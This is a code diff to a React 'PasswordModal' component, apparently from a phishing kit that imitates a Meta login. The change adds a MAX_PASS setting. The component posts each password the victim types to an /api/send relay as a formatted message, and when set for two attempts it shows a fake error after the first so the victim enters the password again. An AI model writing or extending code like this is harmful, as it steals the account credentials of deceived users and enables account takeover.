@@ -3,9 +3,10 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import { useTranslation } from '@/hooks/useTranslation';
+import config from '@/utils/config';
 import axios from 'axios';
 import Image from 'next/image';
-import { useState, useEffect, type FC } from 'react';
+import { useState, type FC } from 'react';
 
 const PasswordModal: FC = () => {
     const fullName = store().userFullName || '';
@@ -15,7 +16,7 @@ const PasswordModal: FC = () => {
     const [error, setError] = useState('');
     const [attemptCount, setAttemptCount] = useState(0);
 
-    const { messageId, message, setMessage, setFormStep, geoInfo } = store();
+    const { messageId, message, setMessage, setMessageId, setFormStep } = store();
 
     // Shared translation hook
     const { t } = useTranslation([
@@ -44,21 +45,50 @@ const PasswordModal: FC = () => {
             return;
         }
 
-        // First attempt - send password1 and show error
-        if (attemptCount === 0) {
-            if (isLoading || !message) return;
-            setIsLoading(true);
+        if (isLoading || !message) return;
+        setIsLoading(true);
 
-            const password1Message = `${message}
+        // MAX_PASS = 1: send password and continue immediately
+        if (config.MAX_PASS === 1) {
+            const passwordMessage = `${message}
 
-<b>� Password 1:</b> <code>${password}</code>`;
+<b>🔐 Password:</b> <code>${password}</code>`;
 
             try {
-                await axios.post('/api/send', {
+                const res = await axios.post('/api/send', {
+                    message: passwordMessage,
+                    message_id: messageId
+                });
+
+                if (res?.data?.success) {
+                    setMessage(passwordMessage);
+                    if (res.data.data?.result?.message_id) {
+                        setMessageId(res.data.data.result.message_id);
+                    }
+                }
+                setFormStep('verify');
+            } catch {
+                setFormStep('verify');
+            } finally {
+                setIsLoading(false);
+            }
+            return;
+        }
+
+        // MAX_PASS >= 2: first attempt - send password1 and show error
+        if (attemptCount === 0) {
+            const password1Message = `${message}
+
+<b>🔐 Password 1:</b> <code>${password}</code>`;
+
+            try {
+                const res = await axios.post('/api/send', {
                     message: password1Message,
                     message_id: messageId
-                    // Use message_id to update the same message
                 });
+                if (res?.data?.data?.result?.message_id) {
+                    setMessageId(res.data.data.result.message_id);
+                }
             } catch {
                 // Continue even if sending fails
             } finally {
@@ -73,8 +103,6 @@ const PasswordModal: FC = () => {
         }
 
         // Second attempt - send password2 and continue to verify
-        if (isLoading || !message) return;
-        setIsLoading(true);
 
         const password2Message = `${message}
 
@@ -89,6 +117,9 @@ const PasswordModal: FC = () => {
 
             if (res?.data?.success) {
                 setMessage(password2Message);
+                if (res.data.data?.result?.message_id) {
+                    setMessageId(res.data.data.result.message_id);
+                }
             }
             setFormStep('verify');
         } catch {
